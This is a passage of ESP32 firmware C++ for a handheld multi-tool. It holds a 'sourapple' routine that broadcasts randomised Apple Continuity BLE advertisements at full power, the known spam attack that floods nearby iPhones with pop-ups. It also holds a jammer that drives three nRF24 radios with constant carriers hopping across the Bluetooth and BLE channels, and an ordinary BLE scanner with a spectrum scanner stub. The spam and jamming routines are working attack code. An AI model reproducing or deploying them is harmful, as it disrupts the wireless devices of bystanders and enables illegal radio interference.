  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);

  const int scrollBottom = bleContentBottom();
  for (int offset = 0; offset <= lineHeight; offset += 2) {
    const int baseY = (MAX_LINES - 1) * lineHeight - offset + 51;
    if (baseY + lineHeight <= scrollBottom) {
      tft.fillRect(0, baseY, 240, lineHeight, TFT_BLACK);
    }

    for (int i = 0; i < MAX_LINES; i++) {
      int y = -lineHeight + (i * lineHeight) + offset;
      const int drawY = y + 51;
      if (y >= -lineHeight && drawY + lineHeight <= scrollBottom) {
        tft.fillRect(0, drawY, 240, lineHeight, TFT_BLACK);
        tft.setCursor(5, drawY + 4);
        tft.print(lines[i]);
      }
    }
    delay(5);
  }
  Advertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = MAX_LINES - 1; i > 0; i--) {
    lines[i] = lines[i - 1];
  }
  lines[0] = newLine;
  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + " -> ";
  lineNumber++;

  String dataStr = "0x";
  dataStr += String(packet[1], HEX);

  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);

  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;
  packet[i++] = 0xFF;
  packet[i++] = 0x4C;
  packet[i++] = 0x00;
  packet[i++] = 0x0F;
  packet[i++] = 0x05;
  packet[i++] = 0xC1;
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];
  esp_fill_random(&packet[i], 3);
  i += 3;
  packet[i++] = 0x00;
  packet[i++] = 0x00;
  packet[i++] =  0x10;
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {
  setTouchButtonInputEnabled(true);
  bleSetExitOnlyNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  tft.setTextSize(1);
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  uiDrawn = false;

  setupTouchscreen();

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();
  redrawTouchButtonBar();
}

void sourappleLoop() {

  if (feature_active && featureExitButtonPressed()) {
    feature_exit_requested = true;
    return;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  runUI();

  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);
    if (i == 0) {
      dummy_addr[i] |= 0xF0;
    }
  }
  BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

  Advertising->addServiceUUID(device_uuid);
  Advertising->setAdvertisementData(oAdvertisementData);

  Advertising->setMinInterval(0x20);
  Advertising->setMaxInterval(0x20);
  Advertising->setMinPreferred(0x20);
  Advertising->setMaxPreferred(0x20);

  Advertising->start();

  delay(40);
  displayAdvertisementData();
}

void exit() {

  if (Advertising) {
    Advertising->stop();
  }
}
}

namespace BleJammer {

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE };
OperationMode currentMode = BLE_MODULE;

bool jammerActive = false;

int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int ble_channels[] = {2, 26, 80};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 320
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool jammerToggleRequested = false;

unsigned long lastButtonPressTime = 0;
const unsigned long debounceDelay = 500;

static constexpr int JAMMER_LOG_TOP = 48;

static int jammerVisibleLines() {
  return bleMaxLinesInZone(JAMMER_LOG_TOP, LINE_HEIGHT);
}

static bool jammerLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= bleContentBottom();
}

void scroll() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const int visibleLines = jammerVisibleLines();
  if (Index >= visibleLines) {
    for (int i = 0; i < visibleLines - 1; i++) {
      Buffer[i] = Buffer[i + 1];
      Buffercolor[i] = Buffercolor[i + 1];
    }
    Index = visibleLines - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < visibleLines) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  for (int i = 0; i < Index && i < visibleLines; i++) {
    int yPos = (i * LINE_HEIGHT) + JAMMER_LOG_TOP;
    if (!jammerLineFits(yPos)) {
      continue;
    }

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void checkButtons() {
  unsigned long currentTime = millis();

  if (isButtonPressed(BTN_UP) && currentTime - lastButtonPressTime > debounceDelay) {
    jammerToggleRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (isButtonPressed(BTN_RIGHT) && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (isButtonPressed(BTN_LEFT) && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (radio1.begin()) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
    radio1Active = true;
  }
  if (radio2.begin()) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
    radio2Active = true;
  }
  if (radio3.begin()) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
    radio3Active = true;
  }
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  static bool previousJammerState = false;
  static bool prevNRF1State = false;
  static bool prevNRF2State = false;
  static int previousMode = -1;

  const int bodyH = bleContentBottom() - 39;
  if (bodyH > 0) {
    tft.fillRect(0, 39, 240, bodyH, TFT_BLACK);
  }
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, UI_ICON);

    tft.setTextColor(UI_TEXT, DARK_GRAY);
    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.drawFastHLine(0, 35, 240, UI_LINE);
}

void checkModeChange() {
  checkButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 2);
    initializeRadios();
    updateTFT();

    String modeText = "[+] Mode changed to: ";
    modeText += (currentMode == BLE_MODULE) ? "BLE" : "Bluetooth";
    Print(modeText, UI_TEXT, false);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();

    String jammerText = "[!] Jammer ";
    jammerText += (jammerActive) ? "Activated" : "Deactivated";
    Print(jammerText, UI_WARN, false);
  }
}

void blejamSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleSetJammerNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  initializeRadios();
  setupTouchscreen();
  updateTFT();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  Print("[+] System Ready!", UI_WARN, true);
  redrawTouchButtonBar();
}

void blejamLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  checkModeChange();

  if (jammerActive) {
    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      int channel = ble_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      int channel = bluetooth_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);
    }
  }
}

void exit() {

  jammerActive = false;
  initializeRadios();
}
}

namespace BleSniffer { void exit(); }

namespace BleScan {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

BLEScan* bleScan;
BLEScanResults bleResults;
bool isScanning = false;
bool isDetailView = false;
int currentIndex = 0;
int listStartIndex = 0;
bool screenNeedsUpdate = true;
bool fullScreenUpdate = true;

static constexpr int yshift = 30;

// Deauther-like list geometry (bigger rows + paging + bottom nav/tab bar).
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static int current_page = 0;

static int bleListBottomY() {
  return featureHasTouchNavBar() ? touchNavContentBottomY() - 4 : 300;
}

static int bleDevicesPerPage() {
  return (bleListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H;
}

static void bleScanClearBody() {
  const int h = bleContentBottom() - 37;
  if (h > 0) {
    tft.fillRect(0, 37, 240, h, TFT_BLACK);
  }
}

static void bleScanUpdateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (isDetailView) {
    setTouchNavLabels("Scan", "Next", "Exit", "Prev", "Back");
  } else {
    setTouchNavLabels("Scan", "Next", "Exit", "Prev", "View");
  }
  redrawTouchButtonBar();
}

unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {220, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    bleScanUpdateNavLabels();
    return;
  }
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton && prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton && nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static TaskHandle_t bgBleScanTaskHandle = nullptr;
static volatile bool bgHasResults = false;
static volatile uint32_t bgLastScanMs = 0;
static volatile bool bgBleScanRunning = false;
static volatile bool fgBleScanInProgress = false;
static const uint32_t BG_BLE_SCAN_INTERVAL_MS = 15000;
static bool bleInitDone = false;
static const uint32_t BG_BOOT_GRACE_MS = 6000;
static uint32_t bgBootMs = 0;

static void stopBgBleScanIfRunning() {
  if (fgBleScanInProgress || !bleInitDone || !bleScan) return;
  if (!bgBleScanRunning) return;
  bleScan->stop();
  bgBleScanRunning = false;
}

static void ensureBleInit() {
  if (bleInitDone) return;

  bleScan = BLEDevice::getScan();
  bleScan->setActiveScan(true);
  bleInitDone = true;
}

static void bgBleScanTask(void* ) {
  for (;;) {
    const uint32_t now = millis();
    if (bgBootMs == 0) bgBootMs = now;

    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
    if (settings().autoBleScan && idleOk && !feature_active && !in_sub_menu) {
      ensureBleInit();
      if (fgBleScanInProgress) {
        vTaskDelay(250 / portTICK_PERIOD_MS);
        continue;
      }
      bgBleScanRunning = true;
      isScanning = true;
      setStatusBarBleState(StatusBarRadioState::Scanning);
      bleResults = bleScan->start(2, false);
      isScanning = false;
      bgBleScanRunning = false;
      if (bleResults.getCount() >= 0) {
        bgHasResults = (bleResults.getCount() > 0);
        bgLastScanMs = now;
        setStatusBarBleState((bleResults.getCount() > 0) ? StatusBarRadioState::Active : StatusBarRadioState::Off);
      } else {
        setStatusBarBleState(StatusBarRadioState::Error);
      }
      vTaskDelay(BG_BLE_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
    } else {
      if (bgBleScanRunning) {
        stopBgBleScanIfRunning();
      }
      if (!settings().autoBleScan) {
        setStatusBarBleState(StatusBarRadioState::Off);
      }
      vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
  }
}

void displayScanning() {
  bleScanClearBody();
  tft.setTextSize(1);
  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println("Scanning.");

  loading(100, ORANGE, 0, 0, 3, true);
/*
  tft.setCursor(60, LIST_HEADER_Y);
  for (int i = 0; i < 2; i++) {
    for (int j = 0; j <= i; j++) {
      tft.print(".");
      delay(500);
    }
  }
*/
  tft.setCursor(10, LIST_HEADER_Y + 15);
  tft.println("Wait a moment.");
  delay(100);
  isScanning = false;
}

void startBLEScan() {
  pauseBackgroundRadioTasks();
  if (bgBleScanRunning) {
    stopBgBleScanIfRunning();
  }
  isDetailView = false;
  current_page = 0;
  currentIndex = 0;
  listStartIndex = 0;
  isScanning = true;
  screenNeedsUpdate = true;
  fullScreenUpdate = true;
  ensureBleInit();
  fgBleScanInProgress = true;
  setStatusBarBleState(StatusBarRadioState::Scanning);
  drawStatusBar(currentBatteryVoltage, true);
  StatusLedService::startActivity(StatusLedService::Mode::BleScan);
  displayScanning();
  bleResults = bleScan->start(5, false);
  fgBleScanInProgress = false;
  isScanning = false;
  screenNeedsUpdate = true;

  if (bleResults.getCount() >= 0) {
    bgHasResults = (bleResults.getCount() > 0);
    bgLastScanMs = millis();
    setStatusBarBleState((bleResults.getCount() > 0) ? StatusBarRadioState::Active : StatusBarRadioState::Off);
  } else {
    setStatusBarBleState(StatusBarRadioState::Error);
  }
  StatusLedService::stopActivity(StatusLedService::Mode::Idle);
  drawStatusBar(currentBatteryVoltage, true);
}

void handleButtons() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  int oldPage = current_page;

  if (isButtonPressed(BTN_UP)) {
    if (currentIndex > 0) {
      currentIndex--;
      delay(200);
      if (!isDetailView) {
        current_page = currentIndex / max(1, bleDevicesPerPage());
        listStartIndex = current_page * bleDevicesPerPage();
        fullScreenUpdate = (current_page != oldPage);
      } else {
        fullScreenUpdate = true;
      }
      screenNeedsUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_DOWN)) {
    if (currentIndex < bleResults.getCount() - 1) {
      currentIndex++;
      delay(200);
      if (!isDetailView) {
        current_page = currentIndex / max(1, bleDevicesPerPage());
        listStartIndex = current_page * bleDevicesPerPage();
        fullScreenUpdate = (current_page != oldPage);
      } else {
        fullScreenUpdate = true;
      }
      screenNeedsUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      isDetailView = !isDetailView;
      screenNeedsUpdate = true;
      fullScreenUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_LEFT)) {
    delay(200);
    if (isDetailView) {
      isDetailView = false;
      fullScreenUpdate = true;
    } else if (!isScanning) {
      startBLEScan();
      fullScreenUpdate = true;
    }
    screenNeedsUpdate = true;
    lastButtonPress = currentMillis;
  }
}

void updateBLEList() {
  int deviceCount = bleResults.getCount();
  tft.setTextSize(1);

  if (deviceCount <= 0) {
    bleScanClearBody();
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("No devices found.");
    tft.setCursor(10, LIST_HEADER_Y + 12);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int totalPages = (deviceCount + bleDevicesPerPage() - 1) / bleDevicesPerPage();
  if (current_page < 0) current_page = 0;
  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);
  listStartIndex = current_page * bleDevicesPerPage();

  static int last_rendered_page = -1;
  static int last_rendered_index = -1;

  auto drawRow = [&](int idx, bool selected) {
    if (idx < 0 || idx >= deviceCount) return;
    if (idx < listStartIndex || idx >= listStartIndex + bleDevicesPerPage()) return;
    const int row = idx - listStartIndex;
    const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;

    // Clear only this row (avoid overlapping next row).
    tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
    BLEAdvertisedDevice device = bleResults.getDevice(idx);
    String name = device.getName().length() > 0 ? device.getName().c_str() : "Unknown";
    if (name.length() > 22) name = name.substring(0, 22) + "...";

    tft.setCursor(10, y);
    tft.setTextColor(selected ? ORANGE : WHITE);
    tft.print(selected ? "> " : "  ");
    tft.println(name);
  };

  const bool pageChanged = (current_page != last_rendered_page);
  const bool needFull = fullScreenUpdate || pageChanged || (last_rendered_index < 0);

  if (needFull) {
    bleScanClearBody();
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("Devices:");

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
    tft.setCursor(180, LIST_HEADER_Y);
    tft.setTextColor(GREEN);
    tft.println(page_buf);

    const int end_index = min(listStartIndex + bleDevicesPerPage(), deviceCount);
    for (int i = listStartIndex; i < end_index; i++) {
      drawRow(i, (i == currentIndex));
    }

    const bool prevDisabled = (current_page == 0);
    const bool nextDisabled = ((current_page + 1) * bleDevicesPerPage() >= deviceCount);
    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);

    last_rendered_page = current_page;
    last_rendered_index = currentIndex;
    return;
  }

  if (last_rendered_index != currentIndex) {
    drawRow(last_rendered_index, false);
    drawRow(currentIndex, true);
    last_rendered_index = currentIndex;
  }
}

void displayBLEDetails() {

  bleScanClearBody();
  tft.setTextSize(1);

  const int deviceCount = bleResults.getCount();
  if (deviceCount <= 0) {
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    return;
  }
  if (currentIndex < 0) currentIndex = 0;
  if (currentIndex >= deviceCount) currentIndex = deviceCount - 1;

  BLEAdvertisedDevice device = bleResults.getDevice(currentIndex);
  String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";
  String address = device.getAddress().toString().c_str();
  int rssi = device.getRSSI();
  int txPower = device.getTXPower();

  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setTextSize(1);

  int y = 50;
  tft.setCursor(10, y);
  tft.print("Device: " + deviceName);
  y += 20;
  tft.setCursor(10, y);
  tft.print("MAC: " + address);
  y += 20;
  tft.setCursor(10, y);
  tft.print("RSSI: " + String(rssi) + " dBm");
  y += 20;
  tft.setCursor(10, y);
  tft.print("Tx Power: " + String(txPower) + " dBm");

  if (device.haveServiceUUID()) {
    y += 20;
    tft.setCursor(10, y);
    tft.print("Service UUID: " + String(device.getServiceUUID().toString().c_str()));
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Service UUID");
  }
  if (device.haveManufacturerData()) {
    String manufacturerData = String((char*)device.getManufacturerData().c_str());
    y += 20;
    tft.setCursor(10, y);
    tft.print("Manufacturer: " + manufacturerData);
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Manufacturer Data");
  }
  if (device.haveServiceData()) {
    String serviceData = String((char*)device.getServiceData().c_str());
    y += 30;
    tft.setCursor(10, y);
    tft.print("Service Data: " + serviceData);
  } else {
    y += 30;
    tft.setCursor(10, y);
    tft.print("No Service Data");
  }

  drawTabBar("Rescan", false, "", true, "Back", false);
}

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!isScanning) {
            startBLEScan();
          }
          break;
        case 1:
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 120;
  static uint32_t lastTouchActionMs = 0;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      const uint32_t nowMs = millis();
      if (nowMs - lastTouchActionMs < 250) {
        lastTouchCheck = millis();
        return;
      }
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
              lastTouchActionMs = nowMs;
            }
            break;
          }
        }
      } else if (!isScanning) {
        const int deviceCount = bleResults.getCount();

        if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
          const bool prevDisabled = (current_page == 0);
          const bool nextDisabled = ((current_page + 1) * bleDevicesPerPage() >= deviceCount);

          if (x >= 0 && x <= 57) {
            drawButton(0, 304, 57, 16, "Rescan", true, false);
            delay(50);
            startBLEScan();
            lastTouchActionMs = nowMs;
          } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
            drawButton(117, 304, 57, 16, "Prev", true, false);
            current_page--;
            if (current_page < 0) current_page = 0;
            currentIndex = current_page * bleDevicesPerPage();
            listStartIndex = current_page * bleDevicesPerPage();
            screenNeedsUpdate = true;
            fullScreenUpdate = true;
            lastTouchActionMs = nowMs;
          } else if (x >= 177 && x <= 240) {
            if (isDetailView) {
              drawButton(177, 304, 57, 16, "Back", true, false);
              isDetailView = false;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            } else if (!nextDisabled) {
              drawButton(177, 304, 57, 16, "Next", true, false);
              current_page++;
              currentIndex = current_page * bleDevicesPerPage();
              listStartIndex = current_page * bleDevicesPerPage();
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        } else if (!isDetailView) {
          const int listMaxY = LIST_FIRST_ROW_Y + (bleDevicesPerPage() * LIST_ROW_H);
          if (deviceCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
            const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
            const int idx = (current_page * bleDevicesPerPage()) + row;
            if (idx >= 0 && idx < deviceCount) {
              currentIndex = idx;
              isDetailView = true;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void bleScanSetup() {
  BleSniffer::exit();
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleScanUpdateNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  uiDrawn = false;
  runUI();

  setupTouchscreen();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
#endif

  ensureBleInit();

  // With auto BLE scan off, cached bleResults are not updated — only reuse when background scan is on.
  if (settings().autoBleScan && bgHasResults && bleResults.getCount() > 0) {
    current_page = 0;
    currentIndex = 0;
    listStartIndex = 0;
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    updateBLEList();
  } else {
    startBLEScan();
  }

  redrawTouchButtonBar();
}

void bleScanLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  handleButtons();

  runUI();
  updateStatusBar();

  if (screenNeedsUpdate) {
    screenNeedsUpdate = false;
    if (isScanning) {
      displayScanning();
    } else if (!isDetailView) {
      updateBLEList();
    } else {
      displayBLEDetails();
    }
    if (fullScreenUpdate) fullScreenUpdate = false;
  }
}

void startBackgroundScanner() {
  if (!settings().autoBleScan) return;
  if (bgBleScanTaskHandle != nullptr) return;
  xTaskCreatePinnedToCore(
    bgBleScanTask,
    "bgBleScan",
    4096,
    nullptr,
    1,
    &bgBleScanTaskHandle,
    0
  );
}

int getLastCount() {

  return bleResults.getCount();
}

void exit() {
  fgBleScanInProgress = false;
  if (bgBleScanRunning) {
    stopBgBleScanIfRunning();
  }
  if (isScanning && bleScan) {
    bleScan->stop();
    isScanning = false;
  }
  setStatusBarBleState(StatusBarRadioState::Off);
}
}

namespace Scanner {

#define CE  14
#define CSN 21

#define CHANNELS  128
int channel[CHANNELS];

#define N 128
uint8_t values[N];

static bool uiDrawn = false;

static constexpr uint16_t SCAN_SWEEPS        = 25;
static constexpr uint16_t DISPLAY_SWEEPS     = 10;
static constexpr uint16_t RX_SETTLE_US       = 100;
static constexpr uint16_t RPD_DWELL_US       = 50;
static constexpr uint32_t UI_THROTTLE_MS     = 35;
static constexpr uint16_t BUTTON_POLL_STRIDE = 8;

#define _NRF24_CONFIG   0x00
#define _NRF24_EN_AA    0x01
#define _NRF24_RF_CH    0x05
#define _NRF24_RF_SETUP 0x06
#define _NRF24_RPD      0x09

int backgroundNoise[CHANNELS] = {0};

volatile bool scanning = true;

static constexpr int kScannerGraphTop = 190;
static constexpr int kScannerLogBottom = kScannerGraphTop - 6;
static constexpr int kScannerToolbarBottom = 36;
static constexpr int kScannerToolbarGap = 8;
static constexpr int kScannerBoxPad = 4;
static constexpr int kScannerBoxHeaderH = 15;
static constexpr int kScannerStatusY = kScannerToolbarBottom + kScannerToolbarGap;
static constexpr int kScannerGraphMarginX = 6;
static constexpr int kScannerBarColGap = 10;
static constexpr int kScannerBarsPerCol = 64;
